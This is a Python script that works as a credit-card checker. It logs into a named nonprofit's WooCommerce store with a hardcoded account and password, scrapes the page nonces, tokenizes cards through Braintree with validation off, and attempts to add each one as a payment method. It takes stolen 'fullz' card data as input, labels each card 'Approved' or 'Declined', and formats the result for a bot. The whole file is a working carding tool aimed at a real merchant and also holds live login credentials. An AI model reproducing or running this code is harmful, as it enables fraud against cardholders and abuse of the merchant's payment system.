import base64
import random
import time
import re
import requests
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def charge_resp(result):
    try:
        if ("Payment method successfully added." in result or
            "Nice! New payment method added" in result or 
            "Invalid postal code or street address." in result or
            "avs: Gateway Rejected: avs" in result or
            "81724: Duplicate card exists in the vault." in result):
            return "Approved ✅"
        else:
            return f"Declined ❌ - {result}"
    except Exception as e:
        return f"Error 🚫 - {str(e)}"

def create_payment_method(fullz):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        accounts = [
            ("soxel63632@skateru.com", "Darkboy336@1234"),
        ]

        username, password = random.choice(accounts)

        if len(mes) < 2:
            mes = "0" + mes

        a = 20
        if len(str(ano)) < 4:
            ano = int(str(a) + str(ano))

        ses = requests.Session()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        response = ses.get('https://iditarod.com/my-account/add-payment-method/', cookies=ses.cookies, headers=headers)

        if 'name="woocommerce-login-nonce"' in response.text:
            login = gets(response.text, 'name="woocommerce-login-nonce" value="', '"')
        else:
            return "Nonce[1] Not Found"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        data = {
            'username': username,
            'password': password,
            'rememberme': 'forever',
            'woocommerce-login-nonce': login,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'login': 'Log in',
        }

        response = ses.post('https://iditarod.com/my-account/add-payment-method/', cookies=ses.cookies, headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        response = ses.get('https://iditarod.com/my-account/add-payment-method/', cookies=ses.cookies, headers=headers)

        if 'name="woocommerce-add-payment-method-nonce"' in response.text:
            pnonce = gets(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            clientToken = gets(response.text, '"client_token_nonce":"', '"')
        else:
            return "Nonce[2] Not Found"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://iditarod.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': clientToken,
        }

        response = ses.post('https://iditarod.com/wp-admin/admin-ajax.php', cookies=ses.cookies, headers=headers, data=data)

        if 'data' in response.json():
            dataToken = response.json()['data']
        else:
            return "Nonce[3] Not Found"

        dec = base64.b64decode(dataToken).decode('utf-8')

        if 'authorizationFingerprint"' in dec:
            at = gets(dec, 'authorizationFingerprint":"', '"')
        else:
            return "Nonce[4] Not Found"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.7',
            'authorization': f'Bearer {at}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'd891c037-b1ca-4cf9-90bc-e31dca938ee4',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = ses.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        if 'token' in response.text:
            token = response.json()['data']['tokenizeCreditCard']['token']
        else:
            return "Nonce[5] Not Found"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'visa'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc_braintree_credit_card_payment_nonce', token),
            ('wc_braintree_device_data', '{"correlation_id":"9924a1a55c66079ae5a851d7acc10794"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', pnonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        response = ses.post('https://iditarod.com/my-account/add-payment-method/', cookies=ses.cookies, headers=headers, data=data)

        if "Payment method successfully added" in response.text or "payment method added" in response.text.lower():
            return response.text

        resp = gets(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>')

        pattern = r"Status code\s*(.*)</li>"
        match = re.search(pattern, resp)

        if match:
            resp = match.group(1).strip() 
        return resp

    except Exception as e:
        logger.error(f"Error in create_payment_method: {str(e)}")
        return str(e)

def process_card_b3(cc):
    """
    Process credit card through Braintree Auth gateway
    Returns: dict with status, response, and gateway
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Braintree Auth"
            }
        
        # Use the existing create_payment_method function
        result = create_payment_method(cc)
        response = charge_resp(result)
        
        # Convert the response to match your bot's format
        if "Approved ✅" in response:
            return {
                "status": "APPROVED",
                "response": "Payment Approved",
                "gateway": "Braintree Auth"
            }
        elif "Declined ❌" in response:
            # Extract the decline reason
            decline_reason = response.replace("Declined ❌ - ", "").strip()
            return {
                "status": "DECLINED",
                "response": decline_reason[:120],  # Limit response length
                "gateway": "Braintree Auth"
            }
        else:
            return {
                "status": "ERROR",
                "response": response,
                "gateway": "Braintree Auth"
            }

    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing Error: {str(e)}",
            "gateway": "Braintree Auth"
        }

